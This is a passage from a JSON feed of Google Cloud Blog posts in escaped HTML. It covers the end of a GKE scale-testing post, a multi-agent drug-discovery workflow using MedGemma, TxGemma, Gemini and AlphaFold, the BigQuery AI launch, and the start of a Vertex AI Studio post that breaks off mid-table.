src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/14_API_Server_latency_for_GET_and_LIST_ope.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 14: API Server latency for GET and LIST operations, remaining stable and well below defined thresholds, and despite the cluster’s massive scale.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"15_API request duration broken down by verb (GET, POST, PUT, PATCH, DELETE), confirming consistent response times under load\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/15_API_request_duration_broken_down_by_ver.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 15: API request duration broken down by verb (GET, POST, PUT, PATCH, DELETE), confirming consistent response times under load.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"16_Duration for LIST operations specifically, remaining stable throughout the benchmark phases\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/16_Duration_for_LIST_operations_specifical.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 16: Duration for LIST operations specifically, remaining stable throughout the benchmark phases.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"17_Total count of Kubernetes objects (including Pods, Leases, and Nodes) in the database, exceeding 1 million objects at peak scale\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/17_Total_count_of_Kubernetes_objects_inclu.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 17: Total count of Kubernetes objects (including Pods, Leases, and Nodes) in the database, exceeding 1 million objects.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Destination: Massive scale</span></h2>\n<p><span style=\"vertical-align: baseline;\">All told, this experiment demonstrated that GKE can support AI and ML workloads at a scale well beyond current public limits. Further, the insights we gained from operating at this scale are helping us plan the GKE’s future development.While we don’t yet officially support 130K nodes, we're very encouraged by these findings. If your workloads require this level of scale, reach out to us to discuss your specific needs! You can also enjoy </span><a href=\"https://www.thecube.net/events/linux-foundation/kubecon-cloudnativecon-na-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">these</span></a><span style=\"vertical-align: baseline;\"> wonderful conversations on scale and other topics from KubeCon at Atlanta with Google experts and analysts. </span></p></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/healthcare-life-sciences/agentic-ai-framework-in-life-sciences-for-rd/",
        "title": "Four agentic workflows you can build for life sciences for R&D",
        "thumbnail": null,
        "author": "Joe Ledsam",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">AI agents, powered by generative AI, are rapidly transforming industries by acting as intelligent, collaborative partners that can interpret goals, plan multi-step actions, and work independently across systems, marking a significant shift in how businesses can find, understand, and act on their data. Our </span><a href=\"https://cloud.google.com/transform/ai-agents-how-to-make-them-your-new-partners-for-business-innovation?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">recent blog</span></a><span style=\"vertical-align: baseline;\"> outlines how AI agents are transforming several industries. </span></p>\n<p><span style=\"vertical-align: baseline;\">Below we describe how to create a modular, end-to-end platform that accelerates the discovery and preclinical optimization of novel therapeutic candidates through a multi-agentic system. The system is designed to move from a high-level disease concept to a set of lead candidates with a high probability of success, regardless of the specific disease or therapeutic modality. </span></p>\n<p><span style=\"vertical-align: baseline;\">We see few key roles to be played by specialized AI agents, each based on a specialized open-weight model from Google, which can in turn be fine-tuned and trained for even more specialized purposes. Given the below agents are all based on open weight models, it gives a lot of room to further fine tune and train these models to build powerful agents.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Four agents you can build for life sciences </strong></h3>\n<p><span style=\"vertical-align: baseline;\">1. </span><strong style=\"vertical-align: baseline;\">MedGemma: \"The strategic intelligence agent\"</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Expertise:</strong><span style=\"vertical-align: baseline;\"> Deep comprehension and synthesis of unstructured biomedical text, medical imaging, clinical data, and scientific literature.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Function:</strong><span style=\"vertical-align: baseline;\"> Acts as a specialized knowledge agent. When directed by the Cognitive Orchestrator, it executes deep search and synthesis across biomedical corpora (e.g., PubMed, patient text records, other modalities such as chest x-rays) to extract findings, build cohorts, and summarize knowledge. MedGemma is especially useful for use cases requiring strict version control (e.g. regulated products), lower inference costs, or requiring substantial adaptation to specific use cases. Additionally its fast performance and efficient cost makes it very suitable for high volume medical use cases where speed and cost are of importance, a lot of those use cases are very common in LifeSciences</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">2. </span><strong style=\"vertical-align: baseline;\">TxGemma: \"The preclinical analyst\"</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Expertise:</strong><span style=\"vertical-align: baseline;\"> Predicting functional and safety properties of therapeutic molecules </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Function:</strong><span style=\"vertical-align: baseline;\"> Predicts preclinical properties of drug candidates </span><span style=\"font-style: italic; vertical-align: baseline;\">in silico</span><span style=\"vertical-align: baseline;\">, such as pharmacokinetics, permeability, toxicity, or efficacy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://developers.googleblog.com/en/introducing-txgemma-open-models-improving-therapeutics-development/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TxGemma Blog</span></a></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\"> 3. </span><strong style=\"vertical-align: baseline;\">Gemini 2.5 Pro: \"The cognitive orchestrator agent\"</strong></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Expertise:</strong><span style=\"vertical-align: baseline;\"> Advanced multi-step reasoning, dynamic planning, and contextual understanding to manage the end-to-end drug discovery workflow.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Function:</strong><span style=\"vertical-align: baseline;\"> Directs the specialized AI agents by interpreting high-level goals, sequencing tasks, evaluating results, and dynamically adapting the workflow to help the scientists achieve  the final therapeutic objective.This orchestrator also accesses various tools. </span><strong style=\"vertical-align: baseline;\">A tool can be a complete, specialized agent (like MedGemma) or a specific model endpoint (like AlphaFold)</strong><span style=\"vertical-align: baseline;\">, and is given a clear, natural language description of its function. For example, the MedGemma tool might be used as: \"</span><span style=\"font-style: italic; vertical-align: baseline;\">A tool that searches and synthesizes biomedical literature to identify potential disease targets based on a given pathology.</span><span style=\"vertical-align: baseline;\">\" </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Note: </span><span style=\"font-style: italic; vertical-align: baseline;\">For uses cases needing a version locked model and change control users have the option of using Gemma (Open Source) for this orchestration</span></p>\n</li>\n</ol>\n<p><span>4. </span><strong style=\"vertical-align: baseline;\">AlphaFold-2 &amp; molecular docking tools: \"The molecular architect\"</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Expertise:</strong><span style=\"vertical-align: baseline;\"> Predicting the precise 3D structure of molecular targets and simulating how candidate molecules physically interact (dock) with them.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Function:</strong><span style=\"vertical-align: baseline;\"> Creates the essential structural blueprint of the drug-target interaction, enabling structure-based design, virtual screening, and specificity analysis</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Here’s the step-by-step process</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Phase 1: Find the target</strong></p>\n<p><span style=\"vertical-align: baseline;\">A scientist prompts the system (e.g., \"Find novel targets for Parkinson's\"). The </span><strong style=\"vertical-align: baseline;\">MedGemma</strong><span style=\"vertical-align: baseline;\"> agent (\"AI Research Analyst\") instantly scans millions of publications and clinical data to identify promising biological targets. The Orchestrator delivers a concise report, and the scientist approves the final target.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Phase 2: Generate candidates</strong></p>\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">AlphaFold</strong><span style=\"vertical-align: baseline;\"> agent (\"Molecular Architect\") builds a 3D model of the target. Then, the </span><strong style=\"vertical-align: baseline;\">TxGemma</strong><span style=\"vertical-align: baseline;\"> agent performs virtual screening, testing thousands of potential drug \"keys\" to see how they \"fit\" the target \"lock,\" creating a shortlist of candidates.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Phase 3: The \"Design-test-refine\" loop</strong></p>\n<p><span style=\"vertical-align: baseline;\">This is the core engine for rapidly improving candidates.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Predict:</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">TxGemma</strong><span style=\"vertical-align: baseline;\"> (\"Preclinical Analyst\") runs a virtual simulation on each candidate, predicting its real-world performance (e.g., potency, toxicity).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Triage:</strong><span style=\"vertical-align: baseline;\"> The </span><strong style=\"vertical-align: baseline;\">Orchestrator</strong><span style=\"vertical-align: baseline;\"> sorts them: </span><strong style=\"vertical-align: baseline;\">\"Promote\"</strong><span style=\"vertical-align: baseline;\"> (looks excellent), </span><strong style=\"vertical-align: baseline;\">\"Archive\"</strong><span style=\"vertical-align: baseline;\"> (a dead end), or </span><strong style=\"vertical-align: baseline;\">\"Optimize\"</strong><span style=\"vertical-align: baseline;\"> (promising, but flawed).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Refine:</strong><span style=\"vertical-align: baseline;\"> \"Optimize\" candidates are automatically refined to fix their specific flaw and are sent right back into the loop.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This </span><strong style=\"vertical-align: baseline;\">Design -&gt; Dock -&gt; Predict -&gt; Refine</strong><span style=\"vertical-align: baseline;\"> cycle runs thousands of times on Google Cloud's high-performance computing, iterating on drug designs at a speed impossible in a physical lab.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Phase 4: Nominate lab-ready leads</strong></p>\n<p><span style=\"vertical-align: baseline;\">After the loop, the Orchestrator presents the human scientist with the final, highly-optimized lead candidates. The scientist makes the final selection, and </span><strong style=\"vertical-align: baseline;\">MedGemma</strong><span style=\"vertical-align: baseline;\"> re-engages to help design the optimal strategy for real-world lab testing.</span></p>\n<p><span style=\"vertical-align: baseline;\">By moving the costly \"test-and-fail\" part of discovery into this rapid, </span><span style=\"font-style: italic; vertical-align: baseline;\">in-silico</span><span style=\"vertical-align: baseline;\"> workflow, we can focus our lab resources on candidates with the highest probability of success, creating a faster, more intelligent path to new therapies.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Reference architecture </strong></h3>\n<p><span style=\"vertical-align: baseline;\">This diagram shows the foundational services and how data flows between them and how services work together.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"LifeScience Diagrams\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/LifeScience_Diagrams.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Executing this sophisticated, iterative workflow requires a robust, scalable, and secure cloud platform. Google Cloud provides a comprehensive suite of services that map directly to the needs of each AI agent and the overall workflow, ensuring data integrity, compliance, and computational power.</span></p>\n<p><strong style=\"vertical-align: baseline;\">How to get started using Google Cloud</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/enterprise-search?e=48754805&amp;hl=en\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Search</strong></a><span style=\"vertical-align: baseline;\"> is the core service for this agent's function. It can create a sophisticated Retrieval-Augmented Generation (RAG) system over a corpus of private biomedical data, such as internal research documents, PubMed literature, and clinical trial data. This directly enables the agent to answer natural language queries and synthesize information with citations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vertex AI</strong><span style=\"vertical-align: baseline;\">. Google Cloud offers managed, optimized AlphaFold environments and integrations. For high-throughput needs, </span><strong style=\"vertical-align: baseline;\">Vertex AI Training</strong><span style=\"vertical-align: baseline;\"> with GPU or TPU acceleration can run thousands of protein folding and docking simulations in parallel. Use </span><a href=\"https://cloud.google.com/products/agent-builder?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=na-US-all-en-dr-skws-all-all-trial-b-dr-1710134&amp;utm_content=text-ad-none-any-DEV_c-CRE_772251321546-ADGP_Hybrid+%7C+SKWS+-+BRO+%7C+Txt-AIML-Conversational+AI-Agent+Builder-KWID_302905484362-kwd-302905484362&amp;utm_term=KW_ai+search-ST_ai+search&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=22980675808&amp;gclid=Cj0KCQjwmYzIBhC6ARIsAHA3IkT59oHvCQLFznH3SPho5aae-PSlqgyQVQIXs_Kf0sZ1c7PIDrkY1qsaAtRQEALw_wcB&amp;e=48754805&amp;hl=en\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Agent Builder</strong></a><span style=\"vertical-align: baseline;\"> to create agents. </span></p>\n</li>\n</ul>\n<hr />\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">We would like to thank </span><span style=\"font-style: italic; vertical-align: baseline;\">Ryan Ye Min Thein</span><span style=\"font-style: italic; vertical-align: baseline;\"> (Customer Engineer, Google Cloud) and </span><span style=\"font-style: italic; vertical-align: baseline;\">Justin Chen</span><span style=\"font-style: italic; vertical-align: baseline;\"> (Clinician Specialist, Google Health) for their contributions</span></sup></p></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/gathering-advanced-data-agent-and-ml-tools-under-bigquery-ai/",
        "title": "BigQuery AI: The convergence of data and AI is here",
        "thumbnail": null,
        "author": "Vaibhav Sethi",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">From uncovering new insights in multimodal data to personalizing customer experiences, AI is emerging as the engine of modern innovation. The explosion in AI adoption has created a need to bring data and AI closer — not only to streamline the AI lifecycle, but also to bring AI-driven insights and workflow automation to everyone in the organization.</span></p>\n<p><span style=\"vertical-align: baseline;\">We created BigQuery ML to bring AI to your data, enabling data scientists and data analysts to build and deploy machine learning models directly inside BigQuery. Over the years, we built on this foundation by introducing capabilities such as AI-powered search, generative AI with SQL and many others. </span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re introducing </span><a href=\"https://docs.cloud.google.com/bigquery/docs/ai-introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery AI</span></a><span style=\"vertical-align: baseline;\">, which brings together BigQuery’s built-in ML capabilities, generative AI functions, vector search, intelligent agents, and agent tools. Using BigQuery AI, you can:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Apply gen AI to your data :</strong><span style=\"vertical-align: baseline;\"> Bring Google and partner AI models directly to your multimodal data in BigQuery through simple SQL functions. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplify your data-to-ML journey:</strong><span style=\"vertical-align: baseline;\"> Manage your whole machine learning lifecycle in BigQuery — everything from feature engineering to model training, tuning, inferencing and monitoring, all without moving your data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Create workflows and apps faster:</strong><span style=\"vertical-align: baseline;\"> Whether you’re a data engineer, data scientist, or business user, you can accelerate your workflows with intuitive, role-specific </span><strong style=\"vertical-align: baseline;\">agents</strong><span style=\"vertical-align: baseline;\"> built right into BigQuery.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Let’s take a closer look at the tools and technologies that fall under the BigQuery AI umbrella.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Unlock insights from multimodal data with generative AI</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Bringing state-of-the-art AI models directly to your data through simple SQL commands can help you perform generative AI tasks as well as unlock deeper, semantic understanding from your multimodal data. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/bigquery/docs/ai-introduction#ai_functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI functions</span></a><span style=\"vertical-align: baseline;\"> integrate LLMs and embedding models directly into your SQL queries, enabling you to perform tasks such as content generation, analysis, summarization, structured data extraction, classification, embedding generation, and data enrichment. You can also use AI functions for routine tasks such as filtering, rating, and classification. With </span><a href=\"https://docs.cloud.google.com/bigquery/docs/generative-ai-overview#managed_ai_functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">managed AI functions</span></a><span style=\"vertical-align: baseline;\">, BigQuery chooses a model for you that is optimized for cost and quality. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/bigquery/docs/ai-introduction#search\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Embeddings and search</span><strong style=\"text-decoration: underline; vertical-align: baseline;\"> </strong><span style=\"text-decoration: underline; vertical-align: baseline;\">functions</span></a><span style=\"vertical-align: baseline;\"> help you find information more intelligently. Traditional text search lets you quickly locate specific keywords in your data, but vector search allows you to search by meaning and context, not just exact words. This helps you uncover conceptually related items, finding relevant information that a simple keyword search would miss. Embeddings and vector search in BigQuery power use cases such as RAG, multimodal search, data deduplication, clustering and recommendation engines.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Data processing to AI inference all under one roof</strong></h3>\n<p><span style=\"vertical-align: baseline;\">When we first launched BigQuery ML, our goal was to bring AI and ML closer to your data, empowering SQL users to perform machine learning tasks directly in BigQuery, on their BigQuery data. Over the years, we added capabilities to provide a complete, end-to-end platform for accelerating the entire machine learning lifecycle.</span></p>\n<p><span style=\"vertical-align: baseline;\">Enterprises are using these capabilities to powerful effect. For instance, </span><a href=\"https://cloud.google.com/blog/products/data-analytics/puma-bigquery-customer-engagement?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PUMA</span></a><span style=\"vertical-align: baseline;\"> used BigQuery's integrated machine learning capabilities to advance beyond manual segmentation, crafting sophisticated audience segments based on purchase propensity. The outcome was hugely impactful: the top ML-derived audience segments demonstrated a remarkable 149.8% surge in click-through rate, a 4.6% uptick in conversion rate, and a 6% increase in average order value.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"image1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_sXPcOkD.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Data processing to AI inference workflow in BigQuery</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">BigQuery AI streamlines the entire machine learning lifecycle by bringing the code to your data.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">No data movement:</strong><span style=\"vertical-align: baseline;\"> Train and run models directly in BigQuery using SQL or Python. No data movement or infrastructure management needed.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">End-to-end lifecycle:</strong><span style=\"vertical-align: baseline;\"> Handle everything from feature engineering to model training, evaluation, tuning , deployment and inference in BigQuery without needing expertise in specialized ML frameworks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Model flexibility:</strong><span style=\"vertical-align: baseline;\"> Choose from built-in models, import custom models you have trained in AI, or use pre-trained models (like TimesFM) for zero-shot inference.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Unified inference:</strong><span style=\"vertical-align: baseline;\"> Seamlessly execute predictions via batch processing, real-time streaming, or remote inference.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">And of course, BigQuery AI lets you use your preferred development environment — BigQuery Studio, the integrated AI-powered </span><a href=\"https://clouddocs.devsite.corp.google.com/bigquery/docs/notebooks-introduction\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Colab Enterprise notebook</span></a><span style=\"vertical-align: baseline;\">, or an IDE of your choice.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Agentic experience for every data user</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Under the BigQuery AI umbrella, we are also consolidating the data agents and assistive AI capabilities that are designed to streamline and automate workflows for various data professionals. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/bigquery/docs/data-engineering-agent-pipelines\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Data Engineering Agent</strong></a><span style=\"vertical-align: baseline;\"> allows you to build, modify, and manage data pipelines by describing your requirements in natural language. It translates your plain-language requests into production-ready SQL code, automating complex tasks like data cleaning, transformations, and schema modeling.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/bigquery/docs/colab-data-science-agent\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Data Science Agent</strong></a><span style=\"vertical-align: baseline;\"> helps automate end-to-end data science workflows. It creates multi-step plans, generating and executing code, reasons about the results, and presents its findings. You also use it to generate visualizations with simple prompts, explain and transform code, as well as </span><span style=\"vertical-align: baseline;\">explain errors and fix them automatically.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/gemini/docs/conversational-analytics-api/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics Agent</strong></a><span style=\"vertical-align: baseline;\"> empowers business users to bypass technical barriers, allowing them to ask questions in natural language and receive clear, actionable intelligence, truly democratizing data for all.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Assistive AI features like </span><a href=\"https://docs.cloud.google.com/bigquery/docs/data-canvas\"><span style=\"text-decoration: underline; vertical-align: baseline;\">data canvas</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/gemini/docs/bigquery/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">code completion</span></a><span style=\"vertical-align: baseline;\"> simplify and speed up routine tasks. </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Beyond first-party agents and assistive AI capabilities, BigQuery also provides a powerful suite of tools for building custom agents and integrating agentic AI into your applications. The </span><a href=\"https://docs.cloud.google.com/gemini/docs/conversational-analytics-api/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics API</span></a><span style=\"vertical-align: baseline;\"> provides the building blocks to embed natural language processing capabilities into your own products for tailored data experiences. And for more advanced use cases, the </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit</span></a><span style=\"vertical-align: baseline;\"> (ADK) offers a full-stack framework to build and deploy complex, multi-agent systems, while the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/pre-built-tools-with-mcp-toolbox\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Model Context Protocol</span></a><span style=\"vertical-align: baseline;\"> (MCP) standardizes how AI models communicate with databases and other tools.</span></p>\n<p><span style=\"vertical-align: baseline;\">AI is changing how we all live and work, and nowhere is that more apparent than in how data professionals are approaching their jobs. BigQuery AI is a significant leap forward in how you can connect your data to AI. To learn more about BigQuery AI and get started with it, check out </span><a href=\"https://docs.cloud.google.com/bigquery/docs/ai-introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this guide</span></a><span style=\"vertical-align: baseline;\">. We can’t wait to see what you build next!</span></p></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/build-with-gemini-in-the-vertex-ai-studio/",
        "title": "Building with Gemini in the newest Vertex AI Studio",
        "thumbnail": null,
        "author": "Dima Prokharau",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, we’re sharing new ways </span><a href=\"http://vertexai.google\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Studio</span></a><span style=\"vertical-align: baseline;\"> – Google’s developer console for production-ready AI – will help teams turn ideas into scalable, production gen AI apps. We've introduced powerful new tools that directly address developer needs for efficiency and team-based work. Now, you can:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Use agents as tools to help you prompt and build</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Collaborate with others much more efficiently</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get started more quickly </span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This all comes with a new, fresh interface that makes it easier to build with Gemini 3 and many other AI foundation models. In this post, we’ll walk you through the new interface, the new capabilities available today, and share tutorials to get started.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A new experience </strong></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_8HqubCp.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The new experience is highly fluid and adaptive to your needs. Start with a prompt or an idea, and we’ll give you the right tools to see it all the way to production.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">1. Agents as tools to help you prompt and build</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Leverage specialized agents right within the Studio to enhance your prompt engineering and application development. These tools reduce manual effort and accelerate complex tasks:</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Agent command</span></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Purpose</span></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Key functionality</span></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 